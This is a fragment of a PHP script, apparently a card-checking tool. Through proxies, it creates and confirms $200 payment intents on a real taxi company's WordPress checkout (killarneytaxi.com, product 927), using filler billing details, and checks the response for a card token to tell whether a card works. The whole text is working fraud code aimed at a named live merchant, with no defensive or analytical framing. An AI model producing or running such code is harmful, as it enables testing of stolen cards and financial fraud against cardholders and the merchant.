...
$str = substr(randomString(), 0,7);
 	$page =  cURL_ProxyOn(
    "https://www.killarneytaxi.com/asp-payment-box/?product_id=927",
    $headers = [
...
if (empty($sid)) {
 ...
 $ajax_create_pi =  cURL_ProxyOn(
    "https://www.killarneytaxi.com/wp-admin/admin-ajax.php",
    $headers = [
        "accept: */*",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://www.killarneytaxi.com/asp-payment-box/?product_id=927",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
    ],
    'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=200&curr=USD&product_id=927&quantity=1&billing_details={"name":"'.$fname.' '.$lname.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"US","postal_code":"'.$postcode.'"}}&token=1139b1821861dde12fe0cb759bd3b80e',
    "POST",
    1,
    $cookie
...
if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {
  ...
  $execute =  cURL_ProxyOn(
        ...
        'action=asp_pp_confirm_pi&nonce='.$ajax_confirm.'&product_id=927&pi_id='.$pi_id.'&token=1139b1821861dde12fe0cb759bd3b80e&opts={"save_payment_method":true,"setup_future_usage":"off_session","payment_method_data":{"type":"card","card":{"token":"'.$token.'"}}}',
        "POST",
        1,
        $cookie
    );
